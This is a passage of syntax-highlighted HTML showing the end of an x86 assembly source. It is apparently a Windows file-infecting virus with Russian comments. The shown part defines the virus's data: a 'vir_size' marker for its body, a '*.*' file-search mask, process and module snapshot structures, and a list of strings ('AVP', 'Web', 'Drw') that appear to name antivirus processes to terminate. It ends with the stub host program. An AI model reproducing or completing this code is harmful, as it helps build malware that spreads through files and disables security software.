</span><span class="sc1">;sMessageBox dd 0</span><span class="sc0">
</span><span class="sc1">;db 'MessageBoxA',0</span><span class="sc0">
</span><span class="sc5">open_handle</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">hSnapshot</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">nmbofread</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">nmbofwrt</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">base_addr</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;базовый адрес модуля с которым мы работаем</span><span class="sc0">
</span><span class="sc5">buffer</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">;содержит адрес выделенной нам памяти</span><span class="sc0">
</span><span class="sc5">prentry</span><span class="sc0"> </span><span class="sc5">PROCESSENTRY32</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
</span><span class="sc5">pr_size</span><span class="sc4">=</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">prentry</span><span class="sc0">
</span><span class="sc5">modentry</span><span class="sc0"> </span><span class="sc5">MODULEENTRY32</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
</span><span class="sc5">mod_size</span><span class="sc4">=</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">modentry</span><span class="sc0">
</span><span class="sc5">term1</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'AVP'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'avp'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Avp'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Web'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'web'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Drw'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'DRW'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'drw'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">n_kernel</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'KERNEL32'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;n_user db   'USER32',0</span><span class="sc0">
</span><span class="sc5">process_to_open</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">nobw</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">kernel_base</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">curr_directory</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">get_proc_addr</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;get_wnd_dir db MAX_PATH dup(0)</span><span class="sc0">
</span><span class="sc5">getpraddrord</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">counter</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">mask</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'*.*'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">wfd</span><span class="sc0"> </span><span class="sc5">WIN32_FIND_DATA</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
</span><span class="sc5">vir_size</span><span class="sc4">=</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">
</span><span class="sc5">host</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">             </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">             </span><span class="sc5">ExitProcess</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0">  </span><span class="sc5">start</span><span class="sc0">







</span></div></body>
</html>
